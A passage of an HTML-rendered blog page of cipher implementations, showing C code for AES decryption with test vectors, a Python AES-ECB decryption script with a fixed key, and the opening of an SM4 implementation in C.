class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aes_decrypt_cbc</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *data, <span class="type">int</span> len, <span class="type">uint8_t</span> *key, <span class="type">uint8_t</span> *iv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint8_t</span> w[<span class="number">4</span> * <span class="number">4</span> * <span class="number">15</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* round key */</span></span><br><span class="line">  <span class="type">uint8_t</span> s[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* state */</span></span><br><span class="line">  <span class="type">uint8_t</span> v[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* iv */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> nr, i, j;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* key expansion */</span></span><br><span class="line">  aes_key_expansion(mode, key, w);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(v, iv, <span class="keyword">sizeof</span>(v));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* start data cypher loop over input buffer */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span> * g_aes_nb[mode]) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init state from user buffer (cyphertext) */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">      s[j] = data[i + j];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* start AES cypher loop over all AES rounds */</span></span><br><span class="line">    <span class="keyword">for</span> (nr = g_aes_rounds[mode]; nr &gt;= <span class="number">0</span>; nr--) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* do AddRoundKey */</span></span><br><span class="line">      aes_add_round_key(mode, s, w, nr);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nr &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nr &lt; g_aes_rounds[mode]) &#123;</span><br><span class="line">          <span class="comment">/* do MixColumns */</span></span><br><span class="line">          inv_mix_columns(mode, s);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* do ShiftRows */</span></span><br><span class="line">        inv_shift_rows(mode, s);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* do SubBytes */</span></span><br><span class="line">        inv_sub_bytes(mode, s);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* save state (cypher) to user buffer */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++) &#123;</span><br><span class="line">      <span class="type">uint8_t</span> p = s[j] ^ v[j];</span><br><span class="line">      v[j] = data[i + j];</span><br><span class="line">      data[i + j] = p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_cypher_128_test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">  <span class="type">uint8_t</span> buf[] = &#123; <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x77</span>,</span><br><span class="line">    <span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0xaa</span>, <span class="number">0xbb</span>, <span class="number">0xcc</span>, <span class="number">0xdd</span>, <span class="number">0xee</span>, <span class="number">0xff</span> &#125;;</span><br><span class="line">  <span class="type">uint8_t</span> key[] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">uint8_t</span> buf[] = &#123; <span class="number">0x32</span>, <span class="number">0x43</span>, <span class="number">0xf6</span>, <span class="number">0xa8</span>, <span class="number">0x88</span>, <span class="number">0x5a</span>, <span class="number">0x30</span>, <span class="number">0x8d</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x98</span>, <span class="number">0xa2</span>, <span class="number">0xe0</span>, <span class="number">0x37</span>, <span class="number">0x07</span>, <span class="number">0x34</span> &#125;;</span><br><span class="line">  <span class="type">uint8_t</span> key[] = &#123; <span class="number">0x2b</span>, <span class="number">0x7e</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x28</span>, <span class="number">0xae</span>, <span class="number">0xd2</span>, <span class="number">0xa6</span>,</span><br><span class="line">    <span class="number">0xab</span>, <span class="number">0xf7</span>, <span class="number">0x15</span>, <span class="number">0x88</span>, <span class="number">0x09</span>, <span class="number">0xcf</span>, <span class="number">0x4f</span>, <span class="number">0x3c</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  aes_encrypt(AES_CYPHER_128, buf, <span class="keyword">sizeof</span>(buf), key);</span><br><span class="line"></span><br><span class="line">  aes_decrypt(AES_CYPHER_128, buf, <span class="keyword">sizeof</span>(buf), key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_cypher_192_test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint8_t</span> buf[] = &#123; <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x77</span>,</span><br><span class="line">    <span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0xaa</span>, <span class="number">0xbb</span>, <span class="number">0xcc</span>, <span class="number">0xdd</span>, <span class="number">0xee</span>, <span class="number">0xff</span> &#125;;</span><br><span class="line">  <span class="type">uint8_t</span> key[] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>,</span><br><span class="line">    <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span> &#125;;</span><br><span class="line"></span><br><span class="line">  aes_encrypt(AES_CYPHER_192, buf, <span class="keyword">sizeof</span>(buf), key);</span><br><span class="line"></span><br><span class="line">  aes_decrypt(AES_CYPHER_192, buf, <span class="keyword">sizeof</span>(buf), key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_cypher_256_test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint8_t</span> buf[] = &#123; <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x77</span>,</span><br><span class="line">    <span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0xaa</span>, <span class="number">0xbb</span>, <span class="number">0xcc</span>, <span class="number">0xdd</span>, <span class="number">0xee</span>, <span class="number">0xff</span> &#125;;</span><br><span class="line">  <span class="type">uint8_t</span> key[] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>,</span><br><span class="line">    <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x1c</span>, <span class="number">0x1d</span>, <span class="number">0x1e</span>, <span class="number">0x1f</span> &#125;;</span><br><span class="line"></span><br><span class="line">  aes_encrypt(AES_CYPHER_256, buf, <span class="keyword">sizeof</span>(buf), key);</span><br><span class="line"></span><br><span class="line">  aes_decrypt(AES_CYPHER_256, buf, <span class="keyword">sizeof</span>(buf), key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//数据</span></span><br><span class="line">  <span class="type">uint8_t</span> buf[] = &#123; <span class="number">78</span>, <span class="number">204</span>, <span class="number">144</span>, <span class="number">217</span>, <span class="number">57</span>, <span class="number">62</span>, <span class="number">169</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">219</span>, <span class="number">206</span>, <span class="number">216</span>, <span class="number">180</span>, <span class="number">137</span>, <span class="number">206</span>, <span class="number">138</span> &#125;;</span><br><span class="line">  <span class="comment">//密钥</span></span><br><span class="line">  <span class="type">uint8_t</span> key[] = &#123; <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span> &#125;;</span><br><span class="line">  <span class="comment">//向量</span></span><br><span class="line">  <span class="comment">//uint8_t iv[] = &#123;&#125;;</span></span><br><span class="line">  <span class="keyword">switch</span> (<span class="keyword">sizeof</span>(key))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="comment">//ECB</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">16</span>:aes_decrypt(AES_CYPHER_128, buf, <span class="keyword">sizeof</span>(buf), key); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">24</span>:aes_decrypt(AES_CYPHER_192, buf, <span class="keyword">sizeof</span>(buf), key); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">32</span>:aes_decrypt(AES_CYPHER_256, buf, <span class="keyword">sizeof</span>(buf), key); <span class="keyword">break</span>;</span><br><span class="line">  <span class="comment">//CBC</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  case 16:aes_decrypt_cbc(AES_CYPHER_128, buf, sizeof(buf), key, iv); break;</span></span><br><span class="line"><span class="comment">  case 24:aes_decrypt_cbc(AES_CYPHER_192, buf, sizeof(buf), key, iv); break;</span></span><br><span class="line"><span class="comment">  case 32:aes_decrypt_cbc(AES_CYPHER_256, buf, sizeof(buf), key, iv); break;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, buf[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_to_16</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>:</span><br><span class="line">        add = <span class="number">16</span> - (<span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        add = <span class="number">0</span></span><br><span class="line">    text = text + (<span class="string">&#x27;\0&#x27;</span> * add)</span><br><span class="line">    <span class="keyword">return</span> text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">&#x27;\x4D\x4C\x57\x4E\x46\x7C\x19\x0A\x4D\x4C\x57\x4E\x46\x7C\x7B\x67&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    mode = AES.MODE_ECB</span><br><span class="line">    text = add_to_16(text)</span><br><span class="line">    cryptos = AES.new(key, mode)</span><br><span class="line">    cipher_text = cryptos.encrypt(text)</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">&#x27;\x4D\x4C\x57\x4E\x46\x7C\x19\x0A\x4D\x4C\x57\x4E\x46\x7C\x7B\x67&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    mode = AES.MODE_ECB</span><br><span class="line">    cryptor = AES.new(key, mode)</span><br><span class="line">    plain_text = cryptor.decrypt(a2b_hex(text))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.decode(plain_text).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;\x96\x7f\x37\x7c\x26\x30\x03\xeb\x61\x6d\xa3\xda\x0c\x77\x3e\x7c\xdf\x18\x5d\x4e\xd9\xbe\x0a\x5c\x02\x36\x87\x37\xb4\x2f\xb1\x9f&#x27;</span></span><br><span class="line">data = b2a_hex(data)</span><br><span class="line">ans = decrypt(data)</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="rc5"><a class="markdownIt-Anchor" href="#rc5">#</a> RC5</h4>
<h4 id="rc6"><a class="markdownIt-Anchor" href="#rc6">#</a> RC6</h4>
<h4 id="sm4"><a class="markdownIt-Anchor" href="#sm4">#</a> SM4</h4>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> GET_ULONG_BE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ULONG_BE(n,b,i) \</span></span><br><span class="line"><span class="meta">  &#123; \</span></span><br><span class="line"><span class="meta">    (n) = ( (unsigned long) (b)[(i) ] &lt;&lt; 24 ) \</span></span><br><span class="line"><span class="meta">          | ( (unsigned long) (b)[(i) + 1] &lt;&lt; 16 ) \</span></span><br><span class="line"><span class="meta">          | ( (unsigned long) (b)[(i) + 2] &lt;&lt; 8 ) \</span></span><br><span class="line"><span class="meta">          | ( (unsigned long) (b)[(i) + 3] ); \</span></span><br><span class="line"><span class="meta">  &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PUT_ULONG_BE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_ULONG_BE(n,b,i) \</span></span><br><span class="line"><span class="meta">  &#123; \</span></span><br><span class="line"><span class="meta">    (b)[(i) ] = (unsigned char) ( (n) &gt;&gt; 24 ); \</span></span><br><span class="line"><span class="meta">    (b)[(i) + 1] = (unsigned char) ( (n) &gt;&gt; 16 ); \</span></span><br><span class="line"><span class="meta">    (b)[(i) + 2] = (unsigned char) ( (n) &gt;&gt; 8 ); \</span></span><br><span class="line"><span class="meta">    (b)[(i) + 3] = (unsigned char) ( (n) ); \</span></span><br><span class="line"><span class="meta">  &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHL(x,n) (((x) &amp; 0xFFFFFFFF) &lt;&lt; n)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTL(x,n) (SHL((x),n) | ((x) &gt;&gt; (32 - n)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAP(a,b) &#123; unsigned long t = a; a = b; b = t; t = 0; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> SboxTable[<span class="number">16</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">  &#123;<span class="number">0xd6</span>,<span class="number">0x90</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xcc</span>,<span class="number">0xe1</span>,<span class="number">0x3d</span>,<span class="number">0xb7</span>,<span class="number">0x16</span>,<span class="number">0xb6</span>,<span class="number">0x14</span>,<span class="number">0xc2</span>,<span class="number">0x28</span>,<span class="number">0xfb</span>,<span class="number">0x2c</span>,<span class="number">0x05</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0x2b</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0xbe</span>,<span class="number">0x04</span>,<span class="number">0xc3</span>,<span class="number">0xaa</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,<span class="number">0x06</span>,<span class="number">0x99</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0x9c</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xf4</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0x98</span>,<span class="number">0x7a</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0b</span>,<span class="number">0x43</span>,<span class="number">0xed</span>,<span class="number">0xcf</span>,<span class="number">0xac</span>,<span class="number">0x62</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0xa9</span>,<span class="number">0xc9</span>,<span class="number">0x08</span>,<span class="number">0xe8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xdf</span>,<span class="number">0x94</span>,<span class="number">0xfa</span>,<span class="number">0x75</span>,<span class="number">0x8f</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xa7</span>,<span class="number">0xfc</span>,<span class="number">0xf3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xba</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,<span class="number">0x19</span>,<span class="number">0xe6</span>,<span class="number">0x85</span>,<span class="number">0x4f</span>,<span class="number">0xa8</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xda</span>,<span class="number">0x8b</span>,<span class="number">0xf8</span>,<span class="number">0xeb</span>,<span class="number">0x0f</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9d</span>,<span class="number">0x35</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0x1e</span>,<span class="number">0x24</span>,<span class="number">0x0e</span>,<span class="number">0x5e</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0xa2</span>,<span class="number">0x25</span>,<span class="number">0x22</span>,<span class="number">0x7c</span>,<span class="number">0x3b</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0xd4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9f</span>,<span class="number">0xd3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,<span class="number">0x4c</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc8</span>,<span class="number">0x9e</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0xea</span>,<span class="number">0xbf</span>,<span class="number">0x8a</span>,<span class="number">0xd2</span>,<span class="number">0x40</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,<span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0xf2</span>,<span class="number">0xce</span>,<span class="number">0xf9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0xe0</span>,<span class="number">0xae</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x9b</span>,<span class="number">0x34</span>,<span class="number">0x1a</span>,<span class="number">0x55</span>,<span class="number">0xad</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xf5</span>,<span class="number">0x8c</span>,<span class="number">0xb1</span>,<span class="number">0xe3</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0x1d</span>,<span class="number">0xf6</span>,<span class="number">0xe2</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0x60</span>,<span class="number">0xc0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xab</span>,<span class="number">0x0d</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x6f</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0xd5</span>,<span class="number">0xdb</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,<span class="number">0xde</span>,<span class="number">0xfd</span>,<span class="number">0x8e</span>,<span class="number">0x2f</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0x6a</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x5b</span>,<span class="number">0x51</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0x8d</span>,<span class="number">0x1b</span>,<span class="number">0xaf</span>,<span class="number">0x92</span>,<span class="number">0xbb</span>,<span class="number">0xdd</span>,<span class="number">0xbc</span>,<span class="number">0x7f</span>,<span class="number">0x11</span>,<span class="number">0xd9</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x1f</span>,<span class="number">0x10</span>,<span class="number">0x5a</span>,<span class="number">0xd8</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0x0a</span>,<span class="number">0xc1</span>,<span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xa5</span>,<span class="number">0xcd</span>,<span class="number">0x7b</span>,<span class="number">0xbd</span>,<span class="number">0x2d</span>,<span class="number">0x74</span>,<span class="number">0xd0</span>,<span class="number">0x12</span>,<span class="number">0xb8</span>,<span class="number">0xe5</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0x89</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4a</span>,<span class="number">0x0c</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x65</span>,<span class="number">0xb9</span>,<span class="number">0xf1</span>,<span class="number">0x09</span>,<span class="number">0xc5</span>,<span class="number">0x6e</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>&#125;,</span><br><span class="line">  &#123;<span class="number">0x18</span>,<span class="number">0xf0</span>,<span class="number">0x7d</span>,<span class="number">0xec</span>,<span class="number">0x3a</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xee</span>,<span class="number">0x5f</span>,<span class="number">0x3e</span>,<span class="number">0xd7</span>,<span class="number">0xcb</span>,<span class="number">0x39</span>,<span class="number">0x48</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> FK[<span class="number">4</span>] = &#123;<span class="number">0xa3b1bac6</span>,<span class="number">0x56aa3350</span>,<span class="number">0x677d9197</span>,<span class="number">0xb27022dc</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> CK[<span class="number">32</span>] = &#123;</span><br><span class="line">  <span class="number">0x00070e15</span>,<span class="number">0x1c232a31</span>,<span class="number">0x383f464d</span>,<span class="number">0x545b6269</span>,</span><br><span class="line">  <span class="number">0x70777e85</span>,<span class="number">0x8c939aa1</span>,<span class="number">0xa8afb6bd</span>,<span class="number">0xc4cbd2d9</span>,</span><br><span class="line">  <span class="number">0xe0e7eef5</span>,<span class="number">0xfc030a11</span>,<span class="number">0x181f262d</span>,<span class="number">0x343b4249</span>,</span><br><span class="line">  <span class="number">0x50575e65</span>,<span class="number">0x6c737a81</span>,<span class="number">0x888f969d</span>,<span class="number">0xa4abb2b9</span>,</span><br><span class="line">  <span class="number">0xc0c7ced5</span>,<span class="number">0xdce3eaf1</span>,<span class="number">0xf8ff060d</span>,<span class="number">0x141b2229</span>,</span><br><span class="line">  <span class="number">0x30373e45</span>,<span class="number">0x4c535a61</span>,<span class="number">0x686f767d</span>,<span class="number">0x848b9299</span>,</span><br><span class="line">  <span class="number">0xa0a7aeb5</span>,<span class="number">0xbcc3cad1</span>,<span class="number">0xd8dfe6ed</span>,<span class="number">0xf4fb0209</span>,</span><br><span class="line">  <span class="number">0x10171e25</span>,<span class="number">0x2c333a41</span>,<span class="number">0x484f565d</span>,<span class="number">0x646b7279</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> <span class="title">sm4Sbox</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> inch)</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *pTable = (<span class="type">unsigned</span> <span class="type">char</span> *)SboxTable;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> retVal = (<span class="type">unsigned</span> <span class="type">char</span>)(pTable[inch]);</span><br><span class="line">  <span class="keyword">return</span> retVal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title">sm4Lt</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> ka)</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> bb = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> c = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> a[<span class="number">4</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> b[<span class="number">4</span>];</span><br><span class="line">  <span class="built_in">PUT_ULONG_BE</span>(ka,a,<span class="number">0</span>)</span><br><span class="line">  b[<span class="number">0</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">0</span>]);</span><br><span class="line">  b[<span class="number">1</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">1</span>]);</span><br><span class="line">  b[<span class="number">2</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">2</span>]);</span><br><span class="line">  b[<span class="number">3</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">3</span>]);</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>(bb,b,<span class="number">0</span>)</span><br><span class="line">  c =bb^(<span class="built_in">ROTL</span>(bb, <span class="number">2</span>))^(<span class="built_in">ROTL</span>(bb, <span class="number">10</span>))^(<span class="built_in">ROTL</span>(bb, <span class="number">18</span>))^(<span class="built_in">ROTL</span>(bb, <span class="number">24</span>));</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span 